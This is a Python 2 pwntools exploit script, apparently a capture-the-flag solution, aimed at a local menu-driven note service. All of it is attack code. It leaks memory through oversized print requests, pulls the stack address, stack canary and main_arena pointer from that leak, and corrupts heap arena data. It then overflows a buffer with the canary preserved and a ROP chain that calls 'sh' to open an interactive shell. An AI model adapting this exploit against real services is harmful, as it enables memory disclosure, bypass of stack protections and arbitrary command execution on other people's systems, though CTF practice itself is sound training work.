#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'
p = remote('127.0.0.1', 7122)

p.sendline('sh\0'.ljust(8) + p64(0x20|2))

def add(idx, sz, dt, ext=''):
	p.send('add'+ext+'\n')
	p.send(str(idx)+'\n')
	p.recvuntil('Size: ')
	p.send(str(sz)+'\n')
	p.send(dt)

def prt(idx, sz):
	p.send('print\n')
	p.send(str(idx)+'\n')
	p.recvuntil('Size: ')
	p.send(str(sz)+'\n')


add(0, 0x21000, '\n')
sleep(0.2)
prt(0, 0x26000)
x = p.recvrepeat(0.2)
for i in range(0, len(x), 8):
	u = u64(x[i:i+8])
	if u != 0:
		print hex(i), hex(u)

stack = u64(x[0x249f0 : 0x249f8]) - 0x70 
canary = u64(x[0x24718 : 0x24720])
arena_off = 0x246b8
main_arena = u64(x[0x246b8 : 0x246c0])
print 'stack', hex(stack)
print 'canary', hex(canary)
print 'main_arena', hex(main_arena)

x = x.replace('\n', '\0')
add(1,0x21000, 'A'*0x22000 + x[:arena_off-8] + p32(0) + p32(1) + p64(0x6020c0+16) + '\n')

rop = flat(
	0x400c43,	# pop rdi
	p64(stack),	# "sh\x00"
	0x40090d	# sh
)

add(2, 24, 'C'*24+p64(canary)+'D'*24+rop+'\n', ' '*13 + p32(0) + p32(1) + p64(stack))

embed()

p.sendline('exit')

p.interactive()

